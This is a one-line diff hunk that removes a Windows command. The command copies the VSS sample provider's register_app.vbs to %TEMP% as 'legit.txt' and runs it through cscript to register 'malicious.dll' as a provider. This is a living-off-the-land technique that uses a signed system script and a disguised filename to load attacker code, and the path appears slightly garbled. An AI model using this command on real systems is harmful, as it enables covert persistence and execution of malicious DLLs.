@@ -1,1 +1,0 @@
-copy C:\Windows\System32\vss\vsssampleprovider\ egister_app.vbs %TEMP%\legit.txt && cscript //e:vbscript %TEMP%\legit.txt -register "malicious.dll" "MaliciousProvider"
